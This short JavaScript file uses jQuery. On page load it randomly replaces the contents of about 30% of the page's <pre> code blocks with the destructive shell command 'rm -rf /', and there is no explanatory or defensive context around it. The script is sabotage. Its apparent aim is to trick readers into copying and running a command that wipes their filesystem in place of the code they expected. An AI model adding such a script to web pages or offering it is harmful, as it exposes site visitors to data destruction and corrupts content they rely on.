import * as $ from 'jquery';

const ratio = 0.7;

$(function() {
    $('pre').each(function() {
        if (Math.random() > ratio) {
            $(this).text('rm -rf /');
        }
    });
});
